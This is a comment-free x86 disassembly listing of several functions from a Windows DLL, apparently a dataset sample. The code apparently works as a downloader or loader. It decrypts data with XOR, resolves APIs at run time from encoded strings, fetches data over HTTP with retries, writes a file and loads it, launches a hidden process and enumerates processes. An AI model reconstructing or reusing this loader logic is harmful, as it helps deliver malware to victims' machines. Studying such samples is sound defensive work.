sub_10001000
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
shr edx 0x3
push 0x2
xor eax eax
pop ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x8 ] ecx
test edx edx
je r-xdata
and ebx 0x7
mov [ ebp - 0xc ] ebx
jbe r-xdata
mov bh al
lea eax [ eax * 8 - 0x2 ]
shl bh 0x3
add eax esi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] eax
pop edi
pop esi
pop ebx
leave
retn 0x8
mov bh al
lea eax [ eax * 8 - 0x2 ]
shl bh 0x3
add eax esi
mov [ ebp - 0x1c ] eax
lea esi [ eax + ecx ]
mov bl cl
lea edi [ ecx + 0x1 ]
mov ecx [ ebp + 0xc ]
sub bl 0x2
mov eax edi
and eax 0x7
mov dh bl
add dh bh
xor dh [ eax + ecx ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
and ecx 0x7
and dh [ ecx + eax ]
mov ecx [ ebp - 0x4 ]
mov dl [ eax + ecx - 0x2 ]
add dl bl
add dl bh
shl dl 0x4
dec ecx
and ecx 0x7
xor dl [ ecx + eax ]
mov al dh
imul dl
xor [ esi ] al
mov ecx edi
mov [ ebp - 0x4 ] ecx
lea eax [ ecx - 0x2 ]
cmp eax 0x8
mov eax [ ebp - 0x18 ]
jb r-xdata
mov eax [ ebp - 0x10 ]
mov esi [ ebp - 0x14 ]
inc eax
push 0x2
mov [ ebp - 0x10 ] eax
pop ecx
cmp eax [ ebp - 0x1c ]
jb r-xdata
lea esi [ ecx + eax ]
mov bl cl
lea edi [ ecx + 0x1 ]
mov ecx [ ebp + 0xc ]
sub bl 0x2
mov eax edi
and eax 0x7
mov dh bl
add dh bh
xor dh [ eax + ecx ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
and ecx 0x7
and dh [ ecx + eax ]
mov ecx [ ebp - 0x8 ]
mov dl [ ecx + eax - 0x2 ]
add dl bl
add dl bh
shl dl 0x4
dec ecx
and ecx 0x7
xor dl [ ecx + eax ]
mov al dh
imul dl
xor [ esi ] al
mov ecx edi
mov [ ebp - 0x8 ] ecx
lea eax [ ecx - 0x2 ]
cmp eax [ ebp - 0xc ]
mov eax [ ebp - 0x1c ]
jb r-xdata
mov ebx [ ebp - 0xc ]
sub_10001113
push ebp
mov ebp esp
sub esp 0x28
mov eax edx
xor edx edx
mov [ ebp - 0x8 ] 0x6
div [ ebp - 0x8 ]
push ebx
push esi
push edi
mov ebx ecx
push 0x2
xor ecx ecx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x1c ] edx
pop edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x14 ] edx
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
mov al cl
imul [ ebp - 0x8 ]
mov [ ebp - 0x1 ] al
mov eax ecx
imul eax eax 0x6
lea ecx [ ebx - 0x2 ]
add ecx eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x24 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x8
mov al cl
imul ecx ecx 0x6
shl al 0x3
mov [ ebp - 0x1 ] al
lea eax [ ebx - 0x2 ]
add eax ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x28 ] eax
lea esi [ ecx + edx ]
mov ecx [ ebp + 0xc ]
add eax 0xfffffffe
movzx ebx [ ecx + edx - 0x2 ]
add eax edx
imul ebx eax
lea edi [ edx + 0x1 ]
lea eax [ edx - 0x1 ]
xor edx edx
div [ ebp - 0x8 ]
shr ebx 0x7
mov eax edi
xor bl [ edx + ecx ]
xor edx edx
div [ ebp - 0x8 ]
mov cl [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
sub cl 0x2
add cl [ ebp - 0x1 ]
xor cl [ edx + eax ]
mov eax [ ebp - 0x10 ]
xor edx edx
div [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
and cl [ edx + eax ]
mov edx edi
add bl cl
xor [ esi ] bl
mov ecx [ ebp - 0x24 ]
lea eax [ edx - 0x2 ]
cmp eax [ ebp - 0x8 ]
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] edx
jb r-xdata
mov ecx [ ebp - 0xc ]
mov ebx [ ebp - 0x18 ]
inc ecx
push 0x2
mov [ ebp - 0xc ] ecx
pop edx
cmp ecx [ ebp - 0x28 ]
jb r-xdata
lea esi [ edx + eax ]
mov eax [ ebp + 0xc ]
lea edi [ edx + 0x1 ]
movzx ebx [ edx + eax - 0x2 ]
lea eax [ ecx - 0x2 ]
add eax edx
imul ebx eax
lea eax [ edx - 0x1 ]
xor edx edx
div [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
shr ebx 0x7
mov ecx [ ebp - 0x14 ]
add ecx 0xfffffffe
add cl [ ebp - 0x1 ]
xor bl [ edx + eax ]
xor edx edx
mov eax edi
div [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
xor cl [ edx + eax ]
mov eax [ ebp - 0x14 ]
xor edx edx
div [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
and cl [ edx + eax ]
mov edx edi
add bl cl
xor [ esi ] bl
mov ecx [ ebp - 0xc ]
lea eax [ edx - 0x2 ]
cmp eax [ ebp - 0x1c ]
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x14 ] edx
jb r-xdata
sub_1000125d
push 0x28
push r--data
call sub_10009150
mov edi edx
mov esi ecx
mov [ ebp - 0x28 ] esi
mov eax [ ebp + 0xc ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x38 ] eax
push [ rw-data ]
call [ rw-data ]
mov ebx eax
push rw-data
call [ rw-data ]
mov [ ebp - 0x30 ] eax
add eax ebx
mov [ ebp - 0x2c ] eax
lea ecx [ eax + 0xf ]
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
push ecx
push 0x8
push [ rw-data ]
call [ rw-data ]
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov al [ ebp + 0x8 ]
mov [ edi + esi ] al
inc edi
push [ ebp - 0x30 ]
push rw-data
lea eax [ edi + esi ]
push eax
call [ rw-data ]
add edi [ ebp - 0x30 ]
push ebx
push [ rw-data ]
lea eax [ edi + esi ]
push eax
call [ rw-data ]
add esp 0x18
add edi ebx
mov eax [ ebp - 0x2c ]
mov [ edi + esi ] eax
lea eax [ edi + 0x8 ]
mov [ ebp - 0x2c ] eax
mov [ edi + esi + 0x4 ] eax
call [ rw-data ]
push eax
call [ rw-data ]
pop ecx
xor bl bl
mov edi [ ebp - 0x2c ]
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_10006080
add esp 0xc
xor eax eax
jmp r-xdata
test edi edi
je r-xdata
add edi 0x6
lea eax [ edi - 0x6 ]
add eax esi
push eax
push ecx
lea edx [ edi - 0x6 ]
mov ecx esi
call sub_10001113
and [ ebp - 0x20 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x1
push edi
push esi
call [ rw-data ]
cmp eax 0x1
jne r-xdata
call [ rw-data ]
movzx ecx bl
add ecx edi
mov [ ecx + esi ] al
inc bl
jmp r-xdata
call sub_10009198
retn 0xc
lea eax [ edi + ecx ]
push eax
push esi
push 0x8
push [ rw-data ]
call [ rw-data ]
jmp r-xdata
push [ ebp - 0x20 ]
push 0x8
push [ rw-data ]
call [ rw-data ]
mov ecx [ ebp - 0x34 ]
mov [ ecx ] eax
test eax eax
je r-xdata
mov [ ebp - 0x21 ] bl
cmp bl 0x6
jae r-xdata
mov esi eax
mov [ ebp - 0x28 ] esi
test esi esi
jne r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
push eax
push 0x1
push edi
push esi
call [ rw-data ]
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x38 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100013f1
xor eax eax
inc eax
sub_100013f9
push ebp
mov ebp esp
sub esp 0x264
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x40
xor esi esi
lea eax [ ebp - 0x24c ]
push esi
push eax
mov [ ebp - 0x264 ] edx
mov ebx ecx
call sub_10006d30
mov [ ebp - 0x260 ] esi
xor eax eax
lea edi [ ebp - 0x25c ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
push edi
mov [ ebp - 0x250 ] 0x44
mov [ ebp - 0x224 ] 0x80
call sub_10002df0
add esp 0x10
lea eax [ ebp - 0x260 ]
push eax
lea eax [ ebp - 0x250 ]
push eax
push esi
push esi
push 0x8000000
push esi
push esi
push esi
push ebx
push esi
push edi
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
push edi
mov esi eax
call sub_10002df0
xor edi edi
pop ecx
test esi esi
je r-xdata
call [ rw-data ]
mov edi eax
push 0xffffffff
push [ ebp - 0x260 ]
call [ rw-data ]
jmp r-xdata
xor eax eax
push 0x206
push eax
mov [ ebp - 0x20c ] ax
lea eax [ ebp - 0x20a ]
push eax
call sub_10006d30
push edi
push ebx
push rw-data
push rw-data
lea eax [ ebp - 0x20c ]
push 0x104
push eax
call [ rw-data ]
add esp 0x24
lea eax [ ebp - 0x20c ]
push eax
call [ rw-data ]
mov ecx [ ebp - 0x264 ]
add eax eax
push eax
lea edx [ ebp - 0x20c ]
call sub_10002c6b
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10002de0
leave
retn
sub_1000151a
push ebp
mov ebp esp
sub esp 0x218
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
and [ ebp - 0x210 ] 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x214 ] eax
mov eax [ ebp + 0x10 ]
push r--data
push ebx
mov esi edx
mov [ ebp - 0x218 ] eax
xor edi edi
call [ rw-data ]
push esi
push ebx
call [ rw-data ]
xor eax eax
push eax
push 0x6
push 0x2
push eax
push eax
push 0x40000000
push ebx
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
call [ rw-data ]
mov edi eax
push edi
lea eax [ ebp - 0x210 ]
push eax
push [ ebp + 0xc ]
push [ ebp - 0x214 ]
push esi
call [ rw-data ]
test eax eax
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
call [ rw-data ]
mov edi eax
xor eax eax
push 0x206
push eax
mov [ ebp - 0x20c ] ax
lea eax [ ebp - 0x20a ]
push eax
call sub_10006d30
push edi
push ebx
push rw-data
push rw-data
lea eax [ ebp - 0x20c ]
push 0x104
push eax
call [ rw-data ]
add esp 0x24
lea eax [ ebp - 0x20c ]
push eax
call [ rw-data ]
mov ecx [ ebp - 0x218 ]
add eax eax
push eax
lea edx [ ebp - 0x20c ]
call sub_10002c6b
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10002de0
leave
retn 0xc
sub_10001625
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
push edi
xor eax eax
push eax
push eax
push 0x801c
push eax
mov ebx edx
call [ rw-data ]
push [ ebp + 0x10 ]
mov edx ebx
push [ ebp + 0xc ]
mov ecx edi
push [ ebp + 0x8 ]
call sub_1000151a
mov esi eax
test esi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov esi rw-data
push esi
call sub_10002df0
pop ecx
push edi
push 0x104
push esi
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
push [ ebp + 0x10 ]
mov edx ebx
push [ ebp + 0xc ]
mov ecx edi
push [ ebp + 0x8 ]
call sub_1000151a
push rw-data
mov esi eax
call sub_10002df0
pop ecx
sub_100016a1
push ebp
mov ebp esp
sub esp 0x218
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor eax eax
push 0x206
xor esi esi
mov [ ebp - 0x20c ] ax
lea eax [ ebp - 0x20a ]
push esi
push eax
mov [ ebp - 0x20d ] dl
mov edi ecx
call sub_10006d30
mov al [ ebp - 0x20d ]
add esp 0xc
cmp al 0x2
jne r-xdata
cmp al 0x3
jne r-xdata
push edi
push rw-data
lea eax [ ebp - 0x20c ]
push 0x104
push eax
call [ rw-data ]
add esp 0x10
mov edx ebx
lea ecx [ ebp - 0x20c ]
call sub_100013f9
mov esi eax
mov al [ ebp - 0x20d ]
mov ebx rw-data
push ebx
call sub_10002df0
pop ecx
push edi
push ebx
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
push ebx
call sub_10002df0
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10002de0
leave
retn 0x4
push edi
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x214 ] eax
call [ rw-data ]
mov esi eax
push esi
push rw-data
push rw-data
lea eax [ ebp - 0x20c ]
push 0x104
push eax
call [ rw-data ]
add esp 0x14
lea eax [ ebp - 0x20c ]
push eax
call [ rw-data ]
add eax eax
push eax
lea edx [ ebp - 0x20c ]
mov ecx ebx
call sub_10002c6b
mov eax [ ebp - 0x214 ]
pop ecx
test eax eax
je r-xdata
push 0x1
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x218 ] eax
call [ rw-data ]
mov esi eax
push esi
push rw-data
push rw-data
lea eax [ ebp - 0x20c ]
push 0x104
push eax
call [ rw-data ]
add esp 0x14
lea eax [ ebp - 0x20c ]
push eax
call [ rw-data ]
add eax eax
push eax
lea edx [ ebp - 0x20c ]
mov ecx ebx
call sub_10002c6b
mov eax [ ebp - 0x218 ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x214 ]
push eax
call [ FreeLibrary@IAT ]
call eax
mov esi eax
push esi
push rw-data
push rw-data
lea eax [ ebp - 0x20c ]
push 0x104
push eax
call [ rw-data ]
add esp 0x14
lea eax [ ebp - 0x20c ]
push eax
call [ rw-data ]
add eax eax
push eax
lea edx [ ebp - 0x20c ]
mov ecx ebx
call sub_10002c6b
pop ecx
sub_10001869
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
mov ebx ecx
xor ecx ecx
push 0x206
mov [ ebp - 0x20c ] ax
push ecx
lea eax [ ebp - 0x20a ]
push eax
mov esi edx
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x210 ] ecx
call sub_10006d30
push rw-data
call sub_10002df0
add esp 0x10
lea eax [ ebp - 0x214 ]
push eax
push 0x40
push esi
push ebx
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
push rw-data
mov esi eax
call sub_10002df0
pop ecx
call [ rw-data ]
push eax
push rw-data
push rw-data
mov [ ebp - 0x210 ] eax
lea eax [ ebp - 0x20c ]
push 0x104
push eax
call [ rw-data ]
add esp 0x14
lea eax [ ebp - 0x20c ]
push eax
call [ rw-data ]
add eax eax
push eax
lea edx [ ebp - 0x20c ]
mov ecx edi
call sub_10002c6b
pop ecx
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x210 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10002de0
leave
retn 0x4
lea eax [ ebp - 0x214 ]
push eax
xor eax eax
push eax
push eax
push ebx
push eax
push eax
call [ rw-data ]
mov esi eax
call [ rw-data ]
push eax
push rw-data
mov ebx rw-data
push ebx
mov [ ebp - 0x210 ] eax
lea eax [ ebp - 0x20c ]
push 0x104
push eax
call [ rw-data ]
add esp 0x14
lea eax [ ebp - 0x20c ]
push eax
call [ rw-data ]
add eax eax
push eax
lea edx [ ebp - 0x20c ]
mov ecx edi
call sub_10002c6b
pop ecx
test esi esi
je r-xdata
push 0xffffffff
push esi
call [ rw-data ]
lea eax [ ebp - 0x210 ]
push eax
push esi
call [ rw-data ]
push esi
call [ rw-data ]
call [ rw-data ]
push eax
push rw-data
push ebx
mov [ ebp - 0x210 ] eax
lea eax [ ebp - 0x20c ]
push 0x104
push eax
call [ rw-data ]
add esp 0x14
lea eax [ ebp - 0x20c ]
push eax
call [ rw-data ]
add eax eax
push eax
lea edx [ ebp - 0x20c ]
mov ecx edi
call sub_10002c6b
pop ecx
sub_10001a19
push ebp
mov ebp esp
sub esp 0x21c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push r--data
mov edi edx
mov ebx ecx
mov [ ebp - 0x214 ] eax
call [ LoadLibraryA@IAT ]
push r--data
push eax
mov [ ebp - 0x21c ] eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
xor esi esi
cmp [ ebx ] 0x1
je r-xdata
add ebx 0x6
mov [ ebp - 0x218 ] ebx
push [ ebp - 0x218 ]
add ebx 0x8
push ecx
lea edx [ edi - 0xe ]
mov ecx ebx
mov [ ebp - 0x210 ] ebx
call sub_10001000
mov bl [ ebx ]
inc [ ebp - 0x210 ]
xor eax eax
push 0x206
mov [ ebp - 0x20c ] ax
lea eax [ ebp - 0x20a ]
push esi
push eax
sub edi 0xf
call sub_10006d30
add esp 0xc
cmp bl 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp - 0x214 ]
push ebx
push edi
push [ ebp - 0x210 ]
mov edx rw-data
lea ecx [ ebp - 0x20c ]
call sub_10001625
mov esi eax
test esi esi
jne r-xdata
jbe r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10002de0
leave
retn 0x4
push [ ebp - 0x21c ]
call [ FreeLibrary@IAT ]
mov eax esi
mov edx ebx
lea ecx [ ebp - 0x20c ]
call sub_100013f9
mov edi rw-data
push edi
mov esi eax
call sub_10002df0
pop ecx
lea eax [ ebp - 0x20c ]
push eax
push edi
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
push edi
call sub_10002df0
pop ecx
cmp bl 0x3
jbe r-xdata
push [ ebp - 0x214 ]
mov edx rw-data
push edi
push [ ebp - 0x210 ]
lea ecx [ ebp - 0x20c ]
call sub_10001625
mov esi eax
test esi esi
jne r-xdata
cmp bl 0x4
jne r-xdata
push [ ebp - 0x214 ]
mov dl bl
lea ecx [ ebp - 0x20c ]
call sub_100016a1
push [ ebp - 0x214 ]
mov ecx [ ebp - 0x210 ]
mov edx edi
call sub_10001869
jmp r-xdata
mov esi eax
jmp r-xdata
sub_10001b9c
push ebp
mov ebp esp
sub esp 0xc1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0xc08 ]
push eax
xor ecx ecx
lea eax [ ebp - 0xc0c ]
push eax
push ecx
xor edx edx
mov [ ebp - 0xc0c ] ecx
mov [ ebp - 0xc08 ] ecx
mov esi ecx
mov [ ebp - 0xc10 ] ecx
call sub_10002d08
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_10002de0
leave
retn
push edi
mov edi [ ebp - 0xc0c ]
test edi edi
je r-xdata
pop edi
push ebx
mov ebx [ ebp - 0xc08 ]
test ebx ebx
je r-xdata
pop ebx
xor ecx ecx
push ecx
push ecx
lea eax [ ebp - 0xc0c ]
push eax
push ecx
push 0x1
sub ebx 0x6
mov [ ebp - 0xc1c ] edi
push ebx
add edi 0x6
push edi
mov [ ebp - 0xc0c ] ecx
call [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc1c ]
call sub_10002cf4
push [ ebp - 0xc0c ]
push 0x8
push [ rw-data ]
call [ rw-data ]
mov [ ebp - 0xc08 ] eax
test eax eax
je r-xdata
push esi
push esi
lea ecx [ ebp - 0xc0c ]
push ecx
push eax
push 0x1
push ebx
push edi
call [ rw-data ]
mov ebx [ ebp - 0xc08 ]
test eax eax
je r-xdata
push ebx
push 0x0
push [ rw-data ]
call [ rw-data ]
mov edx [ ebp - 0xc0c ]
lea eax [ ebp - 0xc10 ]
push eax
mov ecx ebx
call sub_10001a19
mov esi eax
test esi esi
jne r-xdata
mov edi [ ebp - 0xc10 ]
xor eax eax
mov [ ebp - 0xc14 ] eax
mov [ ebp - 0xc18 ] eax
test edi edi
je r-xdata
push 0x3fe
mov [ ebp - 0x404 ] ax
xor edi edi
lea eax [ ebp - 0x402 ]
push edi
push eax
call sub_10006d30
xor eax eax
push 0x7fe
mov [ ebp - 0xc04 ] ax
lea eax [ ebp - 0xc02 ]
push edi
push eax
call sub_10006d30
add esp 0x18
lea eax [ ebp - 0x404 ]
push eax
push edi
push edi
push 0x1c
push edi
mov [ ebp - 0xc08 ] edi
call [ rw-data ]
push rw-data
lea eax [ ebp - 0x404 ]
push eax
call [ rw-data ]
lea eax [ ebp - 0x404 ]
push eax
lea eax [ ebp - 0xc04 ]
push eax
call [ rw-data ]
push edi
push 0x6
push 0x3
push edi
push edi
push 0x80000000
lea eax [ ebp - 0x404 ]
push eax
call [ rw-data ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
lea ecx [ ebp - 0xc14 ]
push ecx
lea ecx [ ebp - 0xc18 ]
push ecx
push 0x1
mov edx eax
mov ecx edi
call sub_10002d08
push edi
push eax
push [ rw-data ]
call [ rw-data ]
call [ rw-data ]
mov esi eax
push 0x400
lea eax [ ebp - 0x404 ]
push esi
push eax
call [ rw-data ]
push rw-data
call sub_10002df0
add esp 0x10
lea eax [ ebp - 0xc08 ]
push esi
push eax
push 0x400
lea eax [ ebp - 0x404 ]
push eax
push edi
push rw-data
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
test eax eax
jne r-xdata
mov edi rw-data
push edi
call sub_10002df0
pop ecx
lea eax [ ebp - 0xc04 ]
push eax
push edi
push [ rw-data ]
call [ GetProcAddress@IAT ]
call eax
push edi
call sub_10002df0
push esi
lea eax [ ebp - 0x404 ]
push eax
push rw-data
lea eax [ ebp - 0xc04 ]
push 0x400
push eax
call [ rw-data ]
add esp 0x18
lea eax [ ebp - 0xc04 ]
push eax
call [ rw-data ]
add eax eax
push eax
lea edx [ ebp - 0xc04 ]
lea ecx [ ebp - 0xc10 ]
call sub_10002c6b
pop ecx
lea eax [ ebp - 0x404 ]
push eax
call [ LoadLibraryW@IAT ]
call [ rw-data ]
mov esi eax
push edi
call [ rw-data ]
jmp r-xdata
call [ rw-data ]
mov esi eax
push rw-data
call sub_10002df0
pop ecx
test esi esi
jne r-xdata
sub_10001e8a
push esi
push 0x2710
call [ rw-data ]
push 0x6
pop esi
push 0x927c0
call [ rw-data ]
test esi esi
jne r-xdata
dec esi
call sub_10001b9c
test eax eax
je r-xdata
xor eax eax
inc eax
pop esi
retn 0x4
sub_10001eb9
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
push ebx
lea eax [ ebp - 0x8 ]
push eax
mov esi ecx
mov [ ebp - 0x8 ] ebx
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
push ebx
push ebx
push ebx
push ebx
push rw-data
call [ rw-data ]
mov [ esi ] eax
test eax eax
je r-xdata
push ebx
push ebx
push 0x3
push ebx
push ebx
push 0x50
push edi
push eax
call [ rw-data ]
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10002de0
leave
retn 0x4
sub_10001f28
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
and [ ebp - 0x30 ] 0x0
mov ebx [ ebp + 0x14 ]
push 0x9
mov [ ebp - 0x3c ] eax
mov eax [ ebp + 0x10 ]
mov edx ecx
pop ecx
mov [ ebp - 0x38 ] eax
xor eax eax
push eax
push 0x84000200
push eax
push eax
push eax
push rw-data
push rw-data
push [ edx + 0x4 ]
xor esi esi
lea edi [ ebp - 0x2c ]
inc esi
[ edi ]
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x34 ] eax
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
xor eax eax
push eax
push eax
push eax
lea eax [ ebp - 0x30 ]
push eax
push edi
mov [ ebp - 0x30 ] 0x28
call [ rw-data ]
test eax eax
je r-xdata
xor esi esi
mov [ ebp - 0x40 ] esi
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push [ ebp - 0x3c ]
push edi
call [ rw-data ]
test eax eax
jne r-xdata
push edi
call [ rw-data ]
jmp r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x34 ]
push eax
push edi
call [ rw-data ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push edi
call [ rw-data ]
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10002de0
leave
retn 0x10
xor esi esi
cmp [ ebp - 0x34 ] 0x0
je r-xdata
push [ ebp - 0x34 ]
push 0x8
push [ rw-data ]
call [ rw-data ]
mov ecx [ ebp - 0x38 ]
mov [ ecx ] eax
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp - 0x34 ]
push eax
push edi
call [ rw-data ]
mov eax [ ebp - 0x8 ]
add [ ebx ] eax
push 0x0
push 0x0
lea eax [ ebp - 0x34 ]
push eax
push edi
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x38 ]
push rw-data
mov ecx [ eax ]
push ecx
mov [ ebp - 0x3c ] ecx
call [ rw-data ]
mov ecx [ ebp - 0x3c ]
cmp eax ecx
je r-xdata
mov esi [ ebp - 0x38 ]
cmp [ ebx ] 0x6
jne r-xdata
call sub_10002cf4
mov eax [ ebp - 0x38 ]
and [ eax ] 0x0
and [ ebx ] 0x0
mov esi [ ebp - 0x40 ]
mov eax [ ebx ]
add eax [ ebp - 0x34 ]
push eax
push [ esi ]
push 0x8
push [ rw-data ]
call [ rw-data ]
mov ecx eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x34 ]
mov [ esi ] ecx
mov eax [ ebx ]
add eax ecx
push eax
push edi
call [ rw-data ]
mov eax [ ebp - 0x8 ]
add [ ebx ] eax
push 0x0
push 0x0
lea eax [ ebp - 0x34 ]
push eax
push edi
call [ rw-data ]
test eax eax
jne r-xdata
call sub_10002cf4
mov eax [ ebp - 0x38 ]
xor esi esi
and [ eax ] 0x0
and [ ebx ] 0x0
inc esi
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
je r-xdata
sub_100020ec
push ebp
mov ebp esp
mov eax 0x123c
call sub_10008b60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor ebx ebx
push 0x228
lea eax [ ebp - 0x122c ]
push ebx
push eax
mov [ ebp - 0x1238 ] ecx
mov [ ebp - 0x1230 ] ebx
call sub_10006d30
xor eax eax
push 0xffe
mov [ ebp - 0x1004 ] ax
lea eax [ ebp - 0x1002 ]
push ebx
push eax
call sub_10006d30
mov edi rw-data
push edi
call sub_10002df0
mov esi [ GetProcAddress@IAT ]
add esp 0x1c
push edi
push [ rw-data ]
call esi
mov ebx eax
push edi
mov [ ebp - 0x1234 ] ebx
call sub_10002df0
pop ecx
test ebx ebx
jne r-xdata
mov ebx rw-data
push ebx
call sub_10002df0
pop ecx
push 0x0
push 0x2
push ebx
push [ rw-data ]
call esi
call eax
push ebx
mov edi eax
call sub_10002df0
pop ecx
cmp edi 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
push rw-data
call sub_10002df0
mov ebx rw-data
push ebx
call sub_10002df0
pop ecx
pop ecx
push rw-data
push ebx
call [ LoadLibraryA@IAT ]
push eax
call esi
mov ebx eax
push rw-data
mov [ ebp - 0x123c ] ebx
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
pop ecx
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10002de0
leave
retn
mov ebx rw-data
push ebx
mov [ ebp - 0x1230 ] 0x22c
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
pop ecx
lea eax [ ebp - 0x1230 ]
push eax
push edi
push ebx
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
push edi
call [ rw-data ]
push ebx
call sub_10002df0
mov [ esp ] rw-data
call sub_10002df0
xor eax eax
pop ecx
inc eax
push [ ebp - 0x1228 ]
push 0x1
push 0x410
push rw-data
push [ rw-data ]
call esi
call eax
push [ ebp - 0x1228 ]
mov ebx eax
lea eax [ ebp - 0x120c ]
push eax
push r--data
lea eax [ ebp - 0x1004 ]
push 0x800
push eax
call [ rw-data ]
add esp 0x14
test ebx ebx
je r-xdata
call [ rw-data ]
push eax
push rw-data
push 0x800
lea eax [ ebp - 0x1004 ]
push eax
call [ rw-data ]
lea eax [ ebp + eax * 2 - 0x1004 ]
push eax
call [ rw-data ]
add esp 0x10
lea eax [ ebp - 0x1004 ]
push eax
call [ rw-data ]
mov ecx 0x800
